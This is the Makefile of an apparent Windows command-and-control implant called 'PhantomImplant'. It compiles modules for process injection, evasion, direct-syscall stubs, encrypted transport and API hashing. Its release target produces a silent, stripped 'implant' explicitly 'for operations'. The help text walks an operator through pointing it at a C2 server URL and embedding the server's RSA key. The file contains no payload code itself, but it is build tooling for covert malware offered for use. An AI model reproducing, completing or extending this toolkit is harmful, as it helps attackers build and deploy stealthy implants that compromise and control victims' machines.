# PhantomImplant - Build System
#
# Two build modes:
#   make debug   - Test mode with console output (for development)
#   make release - Silent implant, no console window (for operations)

CC          = x86_64-w64-mingw32-gcc
NASM        = nasm
STRIP       = x86_64-w64-mingw32-strip
CFLAGS      = -Wall -O2 -Iinclude
LDFLAGS     = -lntdll -lbcrypt -lwinhttp -lcrypt32 -liphlpapi -lws2_32 -lgdi32 -lshlwapi
BUILD_DIR   = build

SRC         = src/api.c src/syscalls.c src/crypto.c src/injection.c \
              src/transport.c src/msgpack.c src/evasion.c src/main.c
ASM_SRC     = asm/syscalls.asm
ASM_OBJ     = $(BUILD_DIR)/syscalls.obj

.PHONY: all debug release clean hashgen gen-hashes help

# Default target
all: debug

# =============================================
# Debug build: console output, test harness
# =============================================
debug: $(ASM_OBJ) | $(BUILD_DIR)
	@echo "[*] Building PhantomImplant (DEBUG mode)..."
	$(CC) $(CFLAGS) -DDEBUG_MODE $(SRC) $(ASM_OBJ) -o $(BUILD_DIR)/phantom-implant-debug.exe $(LDFLAGS)
	@echo "[+] Debug build: $(BUILD_DIR)/phantom-implant-debug.exe"
	@ls -lh $(BUILD_DIR)/phantom-implant-debug.exe

# =============================================
# Release build: silent, no console, stripped
# =============================================
release: $(ASM_OBJ) | $(BUILD_DIR)
	@echo "[*] Building PhantomImplant (RELEASE mode)..."
	$(CC) $(CFLAGS) -mwindows $(SRC) $(ASM_OBJ) -o $(BUILD_DIR)/phantom-implant.exe $(LDFLAGS) -s
	$(STRIP) $(BUILD_DIR)/phantom-implant.exe 2>/dev/null || true
	@echo "[+] Release build: $(BUILD_DIR)/phantom-implant.exe"
	@ls -lh $(BUILD_DIR)/phantom-implant.exe

# =============================================
# Assemble NASM syscall stubs
# =============================================
$(ASM_OBJ): $(ASM_SRC) | $(BUILD_DIR)
	@echo "[*] Assembling syscall stubs..."
	$(NASM) -f win64 $(ASM_SRC) -o $(ASM_OBJ)

# =============================================
# Hash generator utility (runs on Linux)
# =============================================
hashgen: | $(BUILD_DIR)
	gcc src/hashgen.c -o $(BUILD_DIR)/hashgen-linux
	@echo "[+] Hash generator: $(BUILD_DIR)/hashgen-linux"

gen-hashes: hashgen
	@echo ""
	@./$(BUILD_DIR)/hashgen-linux
	@echo ""
	@echo "Copy the output above into include/common.h"

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

clean:
	rm -rf $(BUILD_DIR)

# =============================================
# Help
# =============================================
help:
	@echo ""
	@echo "  PhantomImplant Build System"
	@echo "  =========================="
	@echo ""
	@echo "  Build targets:"
	@echo "    make debug      Build with console output (for testing)"
	@echo "    make release    Build silent implant (for operations)"
	@echo "    make hashgen    Build hash generator utility"
	@echo "    make gen-hashes Print API/module/syscall hashes"
	@echo "    make clean      Remove build artifacts"
	@echo ""
	@echo "  Configuration:"
	@echo "    1. Edit C2_SERVER_URL in src/main.c"
	@echo "    2. Embed your server's RSA public key in g_ServerPubKeyDer[]"
	@echo "    3. Build: make release"
	@echo ""
	@echo "  MSVC Build (Windows):"
	@echo "    ml64 /c /Fo build\\syscalls.obj asm\\syscalls.asm"
	@echo "    cl /O2 /Iinclude src\\*.c build\\syscalls.obj /Fe:build\\phantom-implant.exe"
	@echo "       /link bcrypt.lib winhttp.lib crypt32.lib ntdll.lib /SUBSYSTEM:WINDOWS"
	@echo ""
